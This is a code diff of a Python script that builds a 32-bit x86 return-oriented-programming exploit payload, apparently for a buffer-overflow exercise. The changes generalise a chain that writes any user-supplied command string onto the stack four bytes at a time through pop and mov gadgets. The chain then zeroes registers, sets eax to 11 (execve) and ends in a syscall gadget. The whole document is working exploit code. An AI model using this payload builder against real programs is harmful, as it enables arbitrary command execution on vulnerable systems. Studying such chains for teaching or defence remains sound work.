@@ -122,14 +122,6 @@ INCA = pack("<I", int(rop_gadgets['incA'][0], 0))
 SYS = pack("<I", int(rop_gadgets['sys'][0], 0))
 PAD = pack("<I", 0x46464646)
 
-command_line = input('Command: ').split()
-# print('cmd_line: ', command_line)
-bin_exe = command_line[0]
-# print('cmd: ', command)
-if len(bin_exe) % 4 != 0:
-    bin_exe = '/' + bin_exe
-    print('com ', bin_exe)
-
 def addPadding(gadget, regsSet):
     result = bytes('', 'ascii')
     # print('gadget: ', gadget, '\n')
@@ -153,34 +145,49 @@ def addPadding(gadget, regsSet):
 
     return result
 
+command_line = input('Command: ').split()
+# print('cmd_line: ', command_line)
+exec = command_line[0]
+# print('cmd: ', command)
+right_length = len(exec) % 4
+if right_length != 0:
+    exec = '/' * (4 - right_length) + exec
+    print('com ', exec)
+
+
 # add initial padding
 p = bytes('A' * padding, 'ascii')
 
+# we'll use this to point to the right location on stack
+pointer = 0
 # put stack address to the destination register which we got from the mov gadget
+print ('for: ', int(len(exec)/4))
+for _ in range(int(len(exec)/4)):
+    p += POPDST
+    p += pack("<I", STACKADDR + pointer)
+    p += addPadding(rop_gadgets['popDst'][1], {})
+
+    p += POPSRC
+    p += bytes(exec[pointer:pointer+4], 'ascii')
+    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: pointer})
+
+    p += MOV
+    p += addPadding(rop_gadgets['mov'][1], {})
+    pointer += 4
+
+# p += POPDST
+# p += pack("<I", STACKADDR + 4)
+# p += addPadding(rop_gadgets['popDst'][1], {})
+
+# p += POPSRC
+# p += bytes(exec[4:8], 'ascii')
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 4})
+
+# p += MOV
+# p += addPadding(rop_gadgets['mov'][1], {})
+
 p += POPDST
-p += STACK
-p += addPadding(rop_gadgets['popDst'][1], {})
-
-p += POPSRC
-p += bytes(bin_exe[0:4], 'ascii')
-p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 0})
-
-p += MOV
-p += addPadding(rop_gadgets['mov'][1], {})
-
-p += POPDST
-p += pack("<I", STACKADDR + 4)
-p += addPadding(rop_gadgets['popDst'][1], {})
-
-p += POPSRC
-p += bytes(bin_exe[4:8], 'ascii')
-p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 4})
-
-p += MOV
-p += addPadding(rop_gadgets['mov'][1], {})
-
-p += POPDST
-p += pack("<I", STACKADDR + 8)
+p += pack("<I", STACKADDR + pointer)
 p += addPadding(rop_gadgets['popDst'][1], {})
 
 p += XORSRC
@@ -194,19 +201,19 @@ p += STACK
 p += addPadding(rop_gadgets['popB'][1], {})
 
 p += POPC
-p += pack("<I", STACKADDR + 8)
+p += pack("<I", STACKADDR + pointer)
 p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})
 
 p += POPD
-p += pack("<I", STACKADDR + 8)
-p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': 8})
+p += pack("<I", STACKADDR + pointer)
+p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': pointer})
 
 p += XORA
-p += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': 8})
+p += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': pointer})
 
 for _ in range(11):
     p += INCA
-    p += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': 8})
+    p += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': pointer})
 
 p += SYS
 
